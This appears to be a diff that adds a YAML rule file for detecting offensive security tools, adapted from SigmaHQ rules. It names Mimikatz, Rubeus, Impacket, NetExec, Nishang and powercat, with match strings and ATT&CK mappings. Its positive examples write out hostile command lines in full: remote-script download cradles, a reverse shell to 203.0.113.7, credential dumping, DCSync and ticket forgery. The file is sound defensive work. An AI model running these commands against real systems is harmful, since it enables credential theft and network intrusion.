@@ -1,0 +1,1398 @@
+# Mention patterns for offensive and dual-use tools: command syntax, banners, default artefact names, user agents
+# and protocol strings that the tools themselves emit. Names are the weakest layer (a tool is renamed in seconds),
+# so command and artefact strings are preferred, and a match never says the tool ran. Post-exploitation tools are
+# strong because an authorized test is the only realistic benign source; scanners and tunnels are medium because
+# administrators and authorized testers use them.
+
+- id: mention.tool_mimikatz_modules
+  title: Mimikatz module commands
+  match:
+    literal:
+      - 'sekurlsa::'
+      - 'lsadump::'
+      - 'kerberos::golden'
+      - 'kerberos::ptt'
+      - 'kerberos::list'
+      - 'privilege::debug'
+      - 'token::elevate'
+      - 'dpapi::masterkey'
+      - 'dpapi::cred'
+      - 'dpapi::chrome'
+      - 'dpapi::blob'
+      - 'dpapi::vault'
+      - 'dpapi::rdg'
+      - 'dpapi::wifi'
+      - 'crypto::capi'
+      - 'crypto::cng'
+      - 'vault::cred'
+      - 'vault::list'
+      - 'misc::skeleton'
+      - 'misc::memssp'
+      - 'misc::printnightmare'
+      - 'ts::multirdp'
+      - 'ts::mstsc'
+      - '::aadcookie'
+      - '::ngcsign'
+  case_sensitive: false
+  strength: strong
+  attack: [T1003.001, T1003.006, T1558.001, T1550.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Mimikatz Execution (Teymur Kheirkhabarov, oscd.community, David ANDRE, Tim Shelton)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml
+    license: DRL-1.1
+    upstream_id: a642964e-bead-4bed-8910-1bb4d63e3b4d
+  rationale: >-
+    The module::command syntax is Mimikatz's own (and of its ports such as pypykatz and Invoke-Mimikatz): LSASS
+    secrets, DCSync, golden tickets, skeleton keys, DPAPI. The rule's generic module prefixes ('process::', 'rpc::',
+    'token::', 'crypto::') are narrowed to specific commands because C++ and Rust logs print such scopes.
+  examples:
+    positive:
+      - 'C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
+      - 'powershell -c "Invoke-Mimikatz -Command ''\"lsadump::dcsync /domain:corp.example.org /user:krbtgt\"''"'
+      - 'C:\Users\Public\m.exe "privilege::debug" "kerberos::golden" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "kerberos::ptt" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "kerberos::list" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "token::elevate" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::masterkey" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::cred" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::chrome" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::blob" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::vault" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::rdg" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "dpapi::wifi" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "crypto::capi" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "crypto::cng" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "vault::cred" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "vault::list" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "misc::skeleton" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "misc::memssp" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "misc::printnightmare" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "ts::multirdp" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "ts::mstsc" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "misc::aadcookie" exit'
+      - 'C:\Users\Public\m.exe "privilege::debug" "misc::ngcsign" exit'
+    negative:
+      - '2026-11-20 16:00:00 ERROR [worker] boost::process::child exited with code 1'
+      - '2026-11-20 16:00:01 WARN  [main] crypto::hash: sha256 backend selected'
+
+- id: mention.tool_mimikatz_name
+  title: Mimikatz name or banner
+  match:
+    literal: ['mimikatz', 'gentilkiwi', 'Benjamin DELPY', 'DumpCreds']
+  case_sensitive: false
+  strength: medium
+  attack: [T1003.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Mimikatz Execution (Teymur Kheirkhabarov, oscd.community, David ANDRE, Tim Shelton)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml
+    license: DRL-1.1
+    upstream_id: a642964e-bead-4bed-8910-1bb4d63e3b4d
+  rationale: >-
+    The tool name and its author's handle from the banner. Antivirus detections and security documentation also
+    contain the name, so a bare name is medium; the module commands are the strong entry.
+  examples:
+    positive:
+      - '  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08'
+    negative:
+      - 'Nov 20 16:01:00 ws01 MsMpEng: Scan completed, 0 threats found'
+      - 'C:\Windows\System32\lsass.exe started'
+
+- id: mention.tool_rubeus_commands
+  title: Rubeus Kerberos abuse commands
+  match:
+    literal:
+      - 'asreproast '
+      - 'dump /service:krbtgt'
+      - 'dump /luid:0x'
+      - 'kerberoast '
+      - 'createnetonly /program:'
+      - 'ptt /ticket:'
+      - '/impersonateuser:'
+      - 'renew /ticket:'
+      - 'asktgt /user:'
+      - 'harvest /interval:'
+      - 's4u /user:'
+      - 's4u /ticket:'
+      - 'golden /aes256:'
+      - 'silver /user:'
+      - 'Rubeus.exe'
+  case_sensitive: false
+  strength: strong
+  attack: [T1558.003, T1558.004, T1550.003, T1558.001]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Rubeus Execution (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_rubeus.yml
+    license: DRL-1.1
+    upstream_id: 7ec2c172-dceb-4c10-92c9-87c1881b7e18
+  rationale: >-
+    Rubeus verbs with their argument syntax: Kerberoasting, AS-REP roasting, ticket dumping and pass-the-ticket,
+    S4U delegation abuse and forged tickets. The rule rates false positives as unlikely; 'hash /password:' is left out
+    as generic.
+  examples:
+    positive:
+      - 'C:\Users\Public\r.exe asktgt /user:svc_sql /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt'
+      - 'execute-assembly Rubeus.exe kerberoast /outfile:h.txt'
+      - 'execute-assembly Rubeus.exe asreproast /nowrap'
+      - 'execute-assembly Rubeus.exe dump /service:krbtgt /nowrap'
+      - 'execute-assembly Rubeus.exe dump /luid:0x3e7'
+      - 'execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show'
+      - 'execute-assembly Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6'
+      - 'execute-assembly Rubeus.exe /impersonateuser:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6'
+      - 'execute-assembly Rubeus.exe renew /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6'
+      - 'execute-assembly Rubeus.exe harvest /interval:30 /nowrap'
+      - 'execute-assembly Rubeus.exe s4u /user:svc_sql /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt'
+      - 'execute-assembly Rubeus.exe s4u /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6'
+      - 'execute-assembly Rubeus.exe golden /aes256:4a5c0b9e8f7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a3928170605f4e3 /user:Administrator /ptt'
+      - 'execute-assembly Rubeus.exe silver /user:svc_sql /rc4:2b576acbe6bcfda7294d6bd18041b8fe /ptt'
+    negative:
+      - 'klist purge'
+      - 'setspn -L svc_sql'
+
+- id: mention.tool_impacket_scripts
+  title: Impacket example script names
+  match:
+    literal:
+      - 'secretsdump.py'
+      - 'wmiexec.py'
+      - 'smbexec.py'
+      - 'atexec.py'
+      - 'dcomexec.py'
+      - 'psexec.py'
+      - 'ntlmrelayx'
+      - 'smbrelayx'
+      - 'GetUserSPNs.py'
+      - 'GetNPUsers.py'
+      - 'getST.py'
+      - 'getTGT.py'
+      - 'ticketer.py'
+      - 'goldenPac.py'
+      - 'impacket-secretsdump'
+      - 'impacket-wmiexec'
+      - 'impacket-smbexec'
+      - 'impacket-psexec'
+      - 'impacket-atexec'
+      - 'impacket-GetUserSPNs'
+      - 'impacket-GetNPUsers'
+  case_sensitive: false
+  strength: strong
+  attack: [T1003.003, T1021.002, T1047, T1557.001, T1558.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: HackTool - Impacket Tools Execution (Florian Roth, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/process_creation/proc_creation_win_hktl_impacket_tools.yml
+    license: DRL-1.1
+    upstream_id: 4627c6ae-6899-46e2-aa0c-6ebcb1becd19
+  rationale: >-
+    Impacket's attack scripts (credential dumping, remote execution, relaying, Kerberos abuse) by file name and by
+    Kali package command name. Outside an authorized test host these names appear only when the tooling is staged
+    or run; the 'impacket-scripts' package name itself does not match.
+  examples:
+    positive:
+      - 'Nov 20 16:02:00 kali01 bash[990]: HISTORY: secretsdump.py corp/admin@10.0.0.10 -just-dc-ntlm'
+      - 'Nov 20 16:02:01 lnx02 bash[991]: HISTORY: impacket-wmiexec corp/svc:Passw0rd@10.0.0.12'
+      - 'Nov 21 09:02:01 kali01 bash[4100]: HISTORY: wmiexec.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:02 kali01 bash[4100]: HISTORY: smbexec.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:03 kali01 bash[4100]: HISTORY: atexec.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:04 kali01 bash[4100]: HISTORY: dcomexec.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:05 kali01 bash[4100]: HISTORY: psexec.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:06 kali01 bash[4100]: HISTORY: ntlmrelayx -tf targets.txt -smb2support'
+      - 'Nov 21 09:02:07 kali01 bash[4100]: HISTORY: smbrelayx -tf targets.txt -smb2support'
+      - 'Nov 21 09:02:08 kali01 bash[4100]: HISTORY: GetUserSPNs.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:09 kali01 bash[4100]: HISTORY: GetNPUsers.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:10 kali01 bash[4100]: HISTORY: getST.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:11 kali01 bash[4100]: HISTORY: getTGT.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:12 kali01 bash[4100]: HISTORY: ticketer.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:13 kali01 bash[4100]: HISTORY: goldenPac.py corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:14 kali01 bash[4100]: HISTORY: impacket-secretsdump corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:15 kali01 bash[4100]: HISTORY: impacket-smbexec corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:16 kali01 bash[4100]: HISTORY: impacket-psexec corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:17 kali01 bash[4100]: HISTORY: impacket-atexec corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:18 kali01 bash[4100]: HISTORY: impacket-GetUserSPNs corp.example.org/admin:Passw0rd@10.0.0.10'
+      - 'Nov 21 09:02:19 kali01 bash[4100]: HISTORY: impacket-GetNPUsers corp.example.org/admin:Passw0rd@10.0.0.10'
+    negative:
+      - 'Setting up impacket-scripts (0.12.0-1) ...'
+      - 'Nov 20 16:02:02 lnx02 bash[992]: HISTORY: python3 -m pip install impacket'
+
+- id: mention.tool_impacket_wmiexec_output
+  title: Impacket wmiexec output file on the ADMIN$ share
+  match:
+    anchored: '\\\\127\.0\.0\.1\\ADMIN\$\\__[0-9]{10}\.[0-9]{1,7}'
+  case_sensitive: false
+  strength: strong
+  attack: [T1047, T1021.002]
+  telemetry: [any]
+  source:
+    name: Impacket examples/wmiexec.py (Fortra)
+    url: https://github.com/fortra/impacket/blob/691fc1836693c4fdb78dc776c88f0b58ed5ac96f/examples/wmiexec.py
+    license: Apache-1.1-style (Impacket modified Apache Software License)
+    upstream_id: OUTPUT_FILENAME
+  rationale: >-
+    wmiexec runs 'cmd.exe /Q /c <command> 1> \\127.0.0.1\ADMIN$\__<epoch.fraction> 2>&1' and reads the file back
+    over SMB; the double-underscore epoch file name is set in the script. No Windows component writes command output
+    to ADMIN$ this way.
+  examples:
+    positive:
+      - 'cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1700000000.123456 2>&1'
+    negative:
+      - 'net use \\127.0.0.1\ADMIN$ /user:corp\admin'
+      - 'copy C:\Temp\agent.msi \\fileserver\ADMIN$\Temp\'
+
+- id: mention.tool_impacket_smbexec_artifacts
+  title: Impacket smbexec service command and output name
+  match:
+    literal: ['%COMSPEC% /Q /c ', '\__output_']
+  case_sensitive: false
+  strength: strong
+  attack: [T1569.002, T1021.002]
+  telemetry: [any]
+  source:
+    name: Impacket examples/smbexec.py (Fortra)
+    url: https://github.com/fortra/impacket/blob/691fc1836693c4fdb78dc776c88f0b58ed5ac96f/examples/smbexec.py
+    license: Apache-1.1-style (Impacket modified Apache Software License)
+    upstream_id: RemoteShell
+  rationale: >-
+    smbexec creates a service whose binary path starts with the literal '%COMSPEC% /Q /c ' and writes output to
+    '\__output_<8 letters>' on a share; both strings are fixed in the script. Service installs (event 7045) carrying
+    them are lateral movement.
+  examples:
+    positive:
+      - 'A service was installed in the system. Service Name: XKcDeFgH Service File Name: %COMSPEC% /Q /c echo cd ^> \\%COMPUTERNAME%\C$\__output_aBcDeFgH 2^>^&1 > %SYSTEMROOT%\x.bat'
+    negative:
+      - 'A service was installed in the system. Service Name: CorpAgent Service File Name: "C:\Program Files\Corp\agent.exe"'
+      - 'C:\Windows\system32\cmd.exe /c echo backup complete'
+
+- id: mention.tool_netexec_pwned_label
+  title: NetExec/CrackMapExec admin-access banner
+  match:
+    literal: ['Pwn3d!']
+  case_sensitive: true
+  strength: strong
+  attack: [T1078, T1021.002]
+  telemetry: [any]
+  source:
+    name: NetExec default configuration (nxc.conf)
+    url: https://github.com/Pennyw0rth/NetExec/blob/955a6b5b3c35cfe1f30a40d4ec2bc96e6c74c238/nxc/data/nxc.conf
+    license: BSD-2-Clause
+    upstream_id: pwn3d_label
+  rationale: >-
+    NetExec and CrackMapExec print 'Pwn3d!' when tested credentials give administrative access to a host; captured
+    terminal output or logs with it record a successful credential test across the network.
+  examples:
+    positive:
+      - 'SMB  10.0.0.12  445  WS012  [+] corp\svc_backup:Summer2026! (Pwn3d!)'
+    negative:
+      - 'SMB  10.0.0.12  445  WS012  [-] corp\svc_backup:Summer2026! STATUS_LOGON_FAILURE'
+      - 'Nov 20 16:03:00 ws01 app[700]: user pwned the leaderboard'
+
+- id: mention.tool_netexec_names
+  title: 'NetExec or CrackMapExec tool name'
+  match:
+    literal: ['crackmapexec', 'netexec']
+  case_sensitive: false
+  strength: medium
+  attack: [T1110.003, T1021.002, T1087.002]
+  telemetry: [any]
+  source:
+    name: NetExec default configuration (nxc.conf)
+    url: https://github.com/Pennyw0rth/NetExec/blob/955a6b5b3c35cfe1f30a40d4ec2bc96e6c74c238/nxc/data/nxc.conf
+    license: BSD-2-Clause
+    upstream_id: null
+  rationale: >-
+    The tool names of the most common Windows network attack framework (spraying, enumeration, execution). Security
+    teams also install it for audits, so the name alone is medium.
+  examples:
+    positive:
+      - 'Nov 20 16:04:00 lnx02 bash[993]: HISTORY: crackmapexec smb 10.0.0.0/24 -u users.txt -p Summer2026!'
+    negative:
+      - 'Nov 20 16:04:01 lnx02 bash[994]: HISTORY: smbclient -L //fileserver -U alice'
+      - 'Nov 20 16:04:02 lnx02 bash[995]: HISTORY: net ads info'
+
+- id: mention.tool_netexec_short_cli
+  title: NetExec nxc command with a protocol
+  match:
+    anchored: 'nxc (?:smb|winrm|ldap|mssql|ssh|rdp|wmi|ftp|vnc|nfs) '
+  case_sensitive: true
+  strength: medium
+  attack: [T1110.003, T1021.002, T1087.002]
+  telemetry: [any]
+  source:
+    name: NetExec default configuration (nxc.conf)
+    url: https://github.com/Pennyw0rth/NetExec/blob/955a6b5b3c35cfe1f30a40d4ec2bc96e6c74c238/nxc/data/nxc.conf
+    license: BSD-2-Clause
+    upstream_id: null
+  rationale: >-
+    'nxc <protocol> <targets>' is NetExec's short command. The protocol word right after nxc keeps unrelated uses of
+    the three letters out; audits use it too, so it is medium.
+  examples:
+    positive:
+      - 'Nov 20 16:05:00 lnx02 bash[996]: HISTORY: nxc smb 10.0.0.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee --shares'
+    negative:
+      - 'Nov 20 16:05:01 lnx02 bash[997]: HISTORY: nxcli --version'
+      - 'Nov 20 16:05:02 lnx02 bash[998]: HISTORY: ls ~/.nxc'
+
+- id: mention.tool_powershell_offensive_cmdlets
+  title: Offensive PowerShell cmdlets for credential theft, injection and lateral movement
+  match:
+    literal:
+      - 'Invoke-Mimikatz'
+      - 'Invoke-DCSync'
+      - 'Invoke-ReflectivePEInjection'
+      - 'Invoke-Shellcode'
+      - 'Invoke-DllInjection'
+      - 'Invoke-TokenManipulation'
+      - 'Invoke-CredentialInjection'
+      - 'Get-GPPPassword'
+      - 'Get-LSASecret'
+      - 'Get-PassHashes'
+      - 'Get-VaultCredential'
+      - 'Get-Keystrokes'
+      - 'Invoke-NinjaCopy'
+      - 'Invoke-PowerDump'
+      - 'Invoke-BypassUAC'
+      - 'Invoke-PsExec'
+      - 'Invoke-WMIExec'
+      - 'Invoke-Inveigh'
+      - 'Invoke-Rubeus'
+      - 'Invoke-SafetyKatz'
+      - 'Invoke-BetterSafetyKatz'
+      - 'Invoke-HandleKatz'
+      - 'Invoke-NanoDump'
+      - 'Invoke-PPLDump'
+      - 'Invoke-Zerologon'
+      - 'Invoke-Nightmare'
+      - 'Invoke-Whisker'
+      - 'Invoke-ConPtyShell'
+      - 'Invoke-MalSCCM'
+      - 'Invoke-Tater'
+      - 'Invoke-BadPotato'
+      - 'Out-Minidump'
+      - 'Invoke-DinvokeKatz'
+      - 'Invoke-Internalmonologue'
+      - 'Invoke-KrbRelay'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.001, T1003.001, T1055, T1134, T1021.002]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Malicious PowerShell Commandlets - ScriptBlock (Sean Metcalf, Florian Roth, and others)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml
+    license: DRL-1.1
+    upstream_id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6
+  rationale: >-
+    Function names from PowerSploit, Empire, Inveigh and their successors that dump credentials, inject code, abuse
+    tokens or move laterally. They exist only in offensive toolkits; the realistic benign source is an authorized
+    test.
+  examples:
+    positive:
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Mimikatz -DumpCreds"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-DCSync"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-ReflectivePEInjection"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Shellcode"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-DllInjection"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-TokenManipulation"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-CredentialInjection"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Get-GPPPassword"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Get-LSASecret"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Get-PassHashes"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Get-VaultCredential"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Get-Keystrokes"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-NinjaCopy"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-PowerDump"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-BypassUAC"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-PsExec"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-WMIExec"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Inveigh"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Rubeus"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-SafetyKatz"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-BetterSafetyKatz"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-HandleKatz"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-NanoDump"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-PPLDump"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Zerologon"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Nightmare"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Whisker"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-ConPtyShell"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-MalSCCM"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Tater"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-BadPotato"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Out-Minidump"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-DinvokeKatz"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-Internalmonologue"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-KrbRelay"'
+    negative:
+      - 'powershell -c "Invoke-Command -ComputerName srv01 -ScriptBlock { Get-Service }"'
+      - 'powershell -c "Get-Credential | Export-Clixml cred.xml"'
+
+- id: mention.tool_powershell_recon_cmdlets
+  title: 'Offensive PowerShell reconnaissance and password-spray cmdlet names'
+  match:
+    literal:
+      - 'Invoke-ACLScanner'
+      - 'Invoke-ADRecon'
+      - 'Invoke-AzureHound'
+      - 'Invoke-Grouper'
+      - 'Invoke-Snaffler'
+      - 'Invoke-UserHunter'
+      - 'Invoke-PortScan'
+      - 'Invoke-ARPScan'
+      - 'Invoke-AllChecks'
+      - 'Invoke-Seatbelt'
+      - 'Invoke-winPEAS'
+      - 'Invoke-WinEnum'
+      - 'Find-GPOLocation'
+      - 'Get-Unconstrained'
+      - 'Invoke-DomainPasswordSpray'
+      - 'Invoke-SpraySinglePassword'
+      - 'Invoke-SMBScanner'
+      - 'Get-ServiceUnquoted'
+      - 'Get-RegAlwaysInstallElevated'
+      - 'PowerView.ps1'
+      - 'PowerUp.ps1'
+  case_sensitive: false
+  strength: medium
+  attack: [T1087.002, T1069.002, T1046, T1110.003]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Malicious PowerShell Commandlets - ScriptBlock (Sean Metcalf, Florian Roth, and others)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_malicious_commandlets.yml
+    license: DRL-1.1
+    upstream_id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6
+  rationale: >-
+    Discovery, privilege-escalation checks and password-spraying functions from the same toolkits. Auditors run some
+    of them (PowerUp, ADRecon), so the group is medium; 'PowerUp' and 'PowerView' are matched only with .ps1 because
+    the bare words occur in product names.
+  examples:
+    positive:
+      - 'powershell -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"'
+    negative:
+      - 'powershell -c "Get-ADUser -Filter * -Properties LastLogonDate"'
+      - 'C:\Program Files\PowerUpdate\updater.exe /silent'
+
+- id: mention.tool_nishang_cmdlets
+  title: Nishang PowerShell attack functions
+  match:
+    literal:
+      - 'Invoke-PowerShellTcp'
+      - 'Invoke-PowerShellUdp'
+      - 'Invoke-PowerShellIcmp'
+      - 'Invoke-CredentialsPhish'
+      - 'Gupt-Backdoor'
+      - 'HTTP-Backdoor'
+      - 'DNS_TXT_Pwnage'
+      - 'Add-ConstrainedDelegationBackdoor'
+      - 'Set-DCShadowPermissions'
+      - 'Invoke-MimikatzWDigestDowngrade'
+      - 'Execute-DNSTXT-Code'
+      - 'Do-Exfiltration-Dns'
+      - 'Invoke-JSRatRundll'
+      - 'Invoke-JSRatRegsvr'
+      - 'Invoke-PsGcatAgent'
+      - 'Remove-PoshRat'
+      - 'Get-WLAN-Keys'
+      - 'Powerpreter'
+      - 'Nishang'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.001, T1095, T1048]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Malicious Nishang PowerShell Commandlets (Alec Costello)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/windows/powershell/powershell_script/posh_ps_nishang_malicious_commandlets.yml
+    license: DRL-1.1
+    upstream_id: f772cee9-b7c2-4cb2-8f07-49870adc02e0
+  rationale: >-
+    Nishang reverse shells, backdoors, credential phishing and DNS exfiltration functions; they have no use outside
+    offensive operations. Generic words from the rule's list (Copy-VSS, Out-Word, Password-List, exfill) are left out.
+  examples:
+    positive:
+      - 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.7/Invoke-PowerShellTcp.ps1''); Invoke-PowerShellTcp -Reverse -IPAddress 203.0.113.7 -Port 443"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-PowerShellUdp"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-PowerShellIcmp"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-CredentialsPhish"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Gupt-Backdoor"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); HTTP-Backdoor"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); DNS_TXT_Pwnage"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Add-ConstrainedDelegationBackdoor"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Set-DCShadowPermissions"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-MimikatzWDigestDowngrade"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Execute-DNSTXT-Code"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Do-Exfiltration-Dns"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-JSRatRundll"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-JSRatRegsvr"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Invoke-PsGcatAgent"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Remove-PoshRat"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Get-WLAN-Keys"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Powerpreter"'
+      - 'powershell -ep bypass -c "IEX (iwr http://203.0.113.7/a.ps1); Nishang"'
+    negative:
+      - 'powershell -c "Test-NetConnection srv01 -Port 443"'
+      - 'powershell -c "Get-NetTCPConnection -State Listen"'
+
+- id: mention.tool_powercat_shell
+  title: 'powercat -c or -l with -e cmd or PowerShell'
+  match:
+    anchored: 'powercat {1,3}-(?:c|l)[^\n]{1,120}-e {1,3}(?:cmd|powershell)'
+  case_sensitive: false
+  strength: strong
+  attack: [T1059.001, T1095]
+  telemetry: [any]
+  source:
+    name: powercat (besimorhino)
+    url: https://github.com/besimorhino/powercat/blob/4e33fdfa2850a8940e46d0b69250ae3ba3a8c640/powercat.ps1
+    license: Apache-2.0
+    upstream_id: null
+  rationale: >-
+    powercat is netcat in PowerShell; '-c host -p port -e cmd' sends a shell and '-l -p port -e cmd' serves one.
